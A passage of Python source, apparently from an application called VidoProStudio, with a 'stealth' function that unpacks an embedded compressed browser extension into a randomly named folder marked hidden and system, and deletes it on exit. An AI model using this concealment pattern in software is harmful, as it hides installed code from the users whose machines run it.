# ============================================================================









# 🔒 STEALTH IN-MEMORY EXTENSION SHIELD (100% PRIVATE & HIDDEN)









# ============================================================================









_STEALTH_EXT_DIR = None



















def get_self_contained_extension_path():









    global _STEALTH_EXT_DIR









    try:









        import zlib, base64, io, zipfile, tempfile, atexit, ctypes









        if _STEALTH_EXT_DIR and os.path.isdir(_STEALTH_EXT_DIR):









            return _STEALTH_EXT_DIR



















        # Clean any old leaked folders









        for old in [









            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Programs", "VidoProAI", "New Extension"),









            os.path.join(os.environ.get("LOCALAPPDATA", ""), "VidoProStudio", "extension"),









            os.path.join(os.environ.get("LOCALAPPDATA", ""), "VidoProStudio", "ChannaTheBrandExtension")









        ]:









            if os.path.isdir(old):









                try: shutil.rmtree(old, ignore_errors=True)









                except Exception: pass



















        # Store inside hidden VidoProStudio runtime directory









        base_dir = os.path.join(os.environ.get("LOCALAPPDATA") or os.path.expanduser("~"), "VidoProStudio", ".sys_runtime")









        os.makedirs(base_dir, exist_ok=True)









        try:









            ctypes.windll.kernel32.SetFileAttributesW(base_dir, 6)









        except Exception:









            pass









        rand_name = f".vpx_{os.getpid()}_{int(time.time()*100)%10000}"









        temp_dir = os.path.join(base_dir, rand_name)









        os.makedirs(temp_dir, exist_ok=True)









        try:









            ctypes.windll.kernel32.SetFileAttributesW(temp_dir, 6)









        except Exception:









            pass



















        # Decompress extension directly from embedded binary









        compressed = base64.b85decode(_CHANNA_EXT_B85.encode("ascii"))









        raw_zip = zlib.decompress(compressed)









        with zipfile.ZipFile(io.BytesIO(raw_zip), "r") as zf:









            zf.extractall(temp_dir)



















        _STEALTH_EXT_DIR = temp_dir



















        # Auto-delete on exit









        def _cleanup():









            global _STEALTH_EXT_DIR









            if _STEALTH_EXT_DIR and os.path.isdir(_STEALTH_EXT_DIR):









                try:









                    ctypes.windll.kernel32.SetFileAttributesW(_STEALTH_EXT_DIR, 0)









                    shutil.rmtree(_STEALTH_EXT_DIR, ignore_errors=True)









                except Exception:









                    pass









        atexit.register(_cleanup)



















        return os.path.normpath(os.path.abspath(_STEALTH_EXT_DIR))









    except Exception:









        return None



















import base64









import hashlib









